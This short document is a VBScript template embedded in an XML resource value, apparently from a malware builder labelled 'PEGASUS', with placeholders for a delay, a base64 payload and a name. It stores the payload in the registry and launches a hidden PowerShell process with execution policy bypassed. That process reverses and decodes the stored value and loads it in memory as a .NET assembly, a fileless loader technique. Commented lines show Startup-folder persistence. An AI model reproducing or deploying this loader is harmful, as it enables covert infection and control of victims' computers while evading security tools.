    <value>On Error Resume Next
For x = 0 To #sleep
     WScript.Sleep(1000)
   Next

B64 = "#base64"

Set obj = CreateObject("Wscript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")

'#startup  startPath = obj.SpecialFolders("Startup") &amp; "\PEGASUS.vbs"
'#startup  currentPath = fso.GetAbsolutePathName(wscript.scriptfullname)
Reg = "HKCU\SOFTWARE\PEGASUS\PEGASUS"

if obj.RegRead(Reg) &lt;&gt; B64 then
obj.RegWrite Reg, B64
end if

PS1 = "powershell -noexit -exec bypass -window 1 -Command #startup  $text = ((Get-ItemProperty HKCU:\Software\#name\).#name); $text = -join $text[-1..-$text.Length]; [AppDomain]::CurrentDomain.Load([Convert]::FromBase64String($text)).EntryPoint.Invoke($Null,$Null);"

obj.Run PS1, 0, False</value>
